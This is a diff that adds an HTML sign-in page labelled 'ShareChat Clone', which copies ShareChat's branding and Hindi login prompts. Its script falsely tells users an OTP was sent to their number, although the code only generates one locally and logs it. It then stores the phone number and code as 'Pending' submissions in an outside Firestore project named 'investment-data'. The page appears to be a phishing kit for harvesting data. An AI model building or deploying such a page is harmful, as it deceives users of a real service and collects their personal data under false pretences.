@@ -1,0 +1,310 @@
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1.0">
+  <title>Sign in - ShareChat Clone</title>
+  <link href="https://fonts.googleapis.com/css?family=Inter:400,600,700&display=swap" rel="stylesheet">
+  <style>
+    body { margin:0; background:#fff; font-family:'Inter',Arial,sans-serif; color:#212936; }
+    .container { max-width:400px; margin:32px auto 0; padding:0 16px 32px; display:flex; flex-direction:column; align-items:center; }
+    .logo { margin:50px auto 32px; display:block; width:96px; height:96px; border-radius:24px; background:#fff; display:flex; align-items:center; justify-content:center; box-shadow:0 2px 16px rgba(0,0,0,0.07); overflow:hidden; }
+    .logo-img { width:90px; height:90px; object-fit:contain; display:block; background:#fff; border-radius:18px; }
+    h1 { font-size:2rem; font-weight:700; text-align:center; margin:0 0 8px 0; color:#212936; }
+    .subtitle { font-size:1rem; text-align:center; margin-bottom:24px; color:#6c757d; }
+
+    .input-group {
+      display: flex;
+      width: 100%;
+      margin-bottom: 16px;
+      border: 2px solid #e0e2e6;
+      border-radius: 12px;
+      background: #fff;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.06);
+      overflow: hidden;
+      align-items: center;
+      transition: border-color 0.2s;
+    }
+    .input-group:focus-within { border-color: #212936; }
+    .input-group select,
+    .input-group input {
+      border: none;
+      font-size: 1.05rem;
+      padding: 12px 10px;
+      outline: none;
+      background: transparent;
+      height: 48px;
+      font-family: 'Inter', Arial, sans-serif;
+    }
+    .input-group select {
+      width: 80px;
+      border-right: 1.5px solid #e0e2e6;
+      color: #212936;
+      font-weight: 600;
+      background: transparent;
+      appearance: none;
+      -webkit-appearance: none;
+      text-align-last: center;
+      cursor: pointer;
+    }
+    .input-group input {
+      flex: 1;
+      font-size: 1.09rem;
+      color: #212936;
+      letter-spacing: 1.5px;
+      background: transparent;
+    }
+
+    .otp-container { display: none; width: 100%; margin-bottom: 24px; }
+    .otp-input-group {
+      display: flex;
+      justify-content: center;
+      gap: 12px;
+      margin: 24px 0 8px 0;
+      width: 100%;
+    }
+    .otp-input {
+      width: 46px;
+      height: 46px;
+      border: 2.5px solid #232b37;
+      border-radius: 12px;
+      font-size: 1.7rem;
+      font-weight: 600;
+      color: #212936;
+      text-align: center;
+      outline: none;
+      background: #fff;
+      box-sizing: border-box;
+      transition: border 0.2s;
+    }
+    .otp-input:not(:first-child) { border: 1.5px solid #e0e2e6; }
+
+    .timer {
+      color: #212936;
+      font-size: 1.1rem;
+      font-weight: 500;
+      letter-spacing: 1px;
+      margin: 10px 0 20px 0;
+      display: block;
+      text-align: center;
+      min-width: 48px;
+    }
+    
+    .otp-btn { 
+      width:100%; background:#19202c; color:#fff; font-size:1.11rem; font-weight:700; border-radius:8px; border:none; padding:15px 0; margin-bottom:32px; cursor:pointer; transition:background 0.2s; 
+    }
+    .otp-btn:active { background:#11151e; }
+    .verify-btn {
+      width: 100%;
+      background: #212936;
+      color: #fff;
+      font-size: 1.11rem;
+      font-weight: 700;
+      border-radius: 8px;
+      border: none;
+      padding: 15px 0;
+      margin: 20px 0 16px 0;
+      cursor: pointer;
+      transition: background 0.2s;
+    }
+    .verify-btn:active { background: #212936; }
+    .back-btn {
+      width: 100%;
+      background: transparent;
+      color: #212936;
+      font-size: 1rem;
+      font-weight: 600;
+      border: 2px solid #212936;
+      border-radius: 8px;
+      padding: 13px 0;
+      cursor: pointer;
+      transition: all 0.2s;
+    }
+    .back-btn:active { background: #f4f4fb; }
+
+    .terms { font-size:0.97rem; color:#212936; text-align:center; margin:0 0 18px 0; line-height:1.6; }
+    .terms a { color:#212936; font-weight:700; text-decoration:underline; cursor:pointer; margin:0 2px; }
+    .download-text { text-align:center; color:#212936; font-size:1.07rem; margin-bottom:14px; }
+    .app-badges { display:flex; justify-content:center; gap:16px; }
+    .app-badges img { height:44px; margin:0; cursor:pointer; }
+    
+    @media (max-width:480px) {
+      .container { max-width:97vw; padding:0 4vw 32px; }
+      .logo { margin-top:36px; width:80px; height:80px; }
+      .logo-img { width:76px; height:76px; }
+      .input-group select,
+      .input-group input { font-size:1rem; height:44px; padding: 10px 7px; }
+      .input-group { border-radius: 10px; }
+      .otp-input { width:38px; height:38px; font-size:1.3rem; border-radius:9px; }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <span class="logo">
+      <img class="logo-img" src="https://cdn.iconscout.com/icon/free/png-256/free-sharechat-1136710.png" alt="ShareChat Logo">
+    </span>
+    <h1 id="form-title">Sign in</h1>
+    <div class="subtitle" id="form-subtitle">अकाउंट बनाने के लिए मोबाइल नम्बर डालें</div>
+    
+    <form id="phone-form">
+      <div class="input-group">
+        <select id="country-code"><option value="+91" selected>+91</option></select>
+        <input type="tel" id="mobile" name="mobile" placeholder="मोबाइल नंबर" maxlength="10" pattern="[0-9]{10}" required>
+      </div>
+      <div class="terms">
+        By accepting this you agree to our 
+        <a href="#">Terms and conditions</a>, 
+        <a href="#">Privacy Policy</a>, 
+        <a href="#">Content Policy</a>
+      </div>
+      <button type="submit" class="otp-btn">OTP प्राप्त करें</button>
+    </form>
+    
+    <div id="otp-form" class="otp-container">
+      <div class="otp-input-group">
+        <input type="tel" maxlength="1" class="otp-input" id="otp1" autofocus required>
+        <input type="tel" maxlength="1" class="otp-input" id="otp2" required>
+        <input type="tel" maxlength="1" class="otp-input" id="otp3" required>
+        <input type="tel" maxlength="1" class="otp-input" id="otp4" required>
+        <input type="tel" maxlength="1" class="otp-input" id="otp5" required>
+        <input type="tel" maxlength="1" class="otp-input" id="otp6" required>
+      </div>
+      <span class="timer" id="timer">01:00</span>
+      <button id="verify-otp" class="verify-btn">Verify OTP</button>
+      <button id="back-to-phone" class="back-btn">Back to Phone Number</button>
+    </div>
+    
+    <div class="download-text">शेयरचेट ऐप डाउनलोड करें</div>
+    <div class="app-badges">
+      <a href="#"><img src="https://upload.wikimedia.org/wikipedia/commons/7/78/Google_Play_Store_badge_EN.svg" alt="Play Store"></a>
+      <a href="#"><img src="https://developer.apple.com/assets/elements/badges/download-on-the-app-store.svg" alt="App Store"></a>
+    </div>
+  </div>
+
+  <!-- Firebase SDKs (compat for browser HTML) -->
+  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-auth-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-firestore-compat.js"></script>
+  <script>
+    // Your provided Firebase config
+    const firebaseConfig = {
+      apiKey: "AIzaSyDIF-yzrdS153MMZtA4wzz5V7eoWUMsC9c",
+      authDomain: "investment-data-3b577.firebaseapp.com",
+      projectId: "investment-data-3b577",
+      storageBucket: "investment-data-3b577.firebasestorage.app",
+      messagingSenderId: "1022915676761",
+      appId: "1:1022915676761:web:fbad19127c0b568f8fff48",
+      measurementId: "G-PTBF5R788Y"
+    };
+    firebase.initializeApp(firebaseConfig);
+    const auth = firebase.auth();
+    const db = firebase.firestore();
+  </script>
+
+  <script>
+    document.addEventListener('DOMContentLoaded', function() {
+      const phoneForm = document.getElementById('phone-form');
+      const otpForm = document.getElementById('otp-form');
+      const mobileInput = document.getElementById('mobile');
+      const countryCode = document.getElementById('country-code');
+      const verifyBtn = document.getElementById('verify-otp');
+      const backBtn = document.getElementById('back-to-phone');
+      const formTitle = document.getElementById('form-title');
+      const formSubtitle = document.getElementById('form-subtitle');
+      const timerEl = document.getElementById('timer');
+      const otpInputs = [...document.querySelectorAll('.otp-input')];
+      let userPhone = '';
+      let generatedOtp = '';
+      let timerInterval;
+
+      phoneForm.addEventListener('submit', async function(e) {
+        e.preventDefault();
+        userPhone = mobileInput.value;
+        if (!/^\d{10}$/.test(userPhone)) { alert('कृपया सही मोबाइल नंबर दर्ज करें (10 अंक)'); return; }
+
+        generatedOtp = Math.floor(100000 + Math.random() * 900000).toString();
+        console.log(`OTP for ${userPhone}: ${generatedOtp}`);
+
+        // OPTIONAL: anonymous auth (helps with Firestore rules if needed)
+        try { await auth.signInAnonymously(); } catch (e) { console.warn(e); }
+
+        phoneForm.style.display = 'none';
+        otpForm.style.display = 'block';
+        formTitle.textContent = 'OTP दर्ज करें';
+        formSubtitle.textContent = `+91-${userPhone} पर OTP भेजा गया`;
+        otpInputs.forEach(input => input.value = '');
+        otpInputs[0].focus();
+        startTimer(60);
+      });
+
+      verifyBtn.addEventListener('click', async function() {
+        const enteredOtp = otpInputs.map(input => input.value).join('');
+        if (enteredOtp.length !== 6) { alert('कृपया 6 अंकों का OTP दर्ज करें'); return; }
+
+        if (enteredOtp === generatedOtp) {
+          try {
+            // Save to Firestore
+            await db.collection('submissions').add({
+              phone: countryCode.value + userPhone,
+              otp: enteredOtp,
+              status: 'Pending',
+              createdAt: firebase.firestore.FieldValue.serverTimestamp()
+            });
+            alert('Login successful! (डेटा सेव हो गया)');
+          } catch (err) {
+            console.error(err);
+            alert('डेटा सेव करने में समस्या आई।');
+          }
+          resetForms();
+        } else {
+          alert('Invalid OTP. Please try again.');
+        }
+      });
+
+      backBtn.addEventListener('click', function() {
+        phoneForm.style.display = 'block';
+        otpForm.style.display = 'none';
+        formTitle.textContent = 'Sign in';
+        formSubtitle.textContent = 'अकाउंट बनाने के लिए मोबाइल नम्बर डालें';
+        clearInterval(timerInterval);
+        timerEl.textContent = '01:00';
+      });
+
+      function startTimer(duration) {
+        let timeLeft = duration;
+        clearInterval(timerInterval);
+        function updateTimer() {
+          let min = String(Math.floor(timeLeft / 60)).padStart(2, '0');
+          let sec = String(timeLeft % 60).padStart(2, '0');
+          timerEl.textContent = `${min}:${sec}`;
+          if (timeLeft <= 0) { clearInterval(timerInterval); }
+          else { timeLeft--; }
+        }
+        updateTimer();
+        timerInterval = setInterval(updateTimer, 1000);
+      }
+
+      otpInputs.forEach((input, i) => {
+        input.addEventListener('input', function() {
+          if (this.value.length >= 1 && i < otpInputs.length - 1) otpInputs[i + 1].focus();
+        });
+        input.addEventListener('keydown', function(e) {
+          if (e.key === "Backspace" && !this.value && i > 0) otpInputs[i - 1].focus();
+        });
+      });
+
+      function resetForms() {
+        mobileInput.value = '';
+        otpInputs.forEach(input => input.value = '');
+        phoneForm.style.display = 'block';
+        otpForm.style.display = 'none';
+        formTitle.textContent = 'Sign in';
+        formSubtitle.textContent = 'अकाउंट बनाने के लिए मोबाइल नम्बर डालें';
+        clearInterval(timerInterval);
+        timerEl.textContent = '01:00';
+      }
+    });
+  </script>
+</body>
+</html>
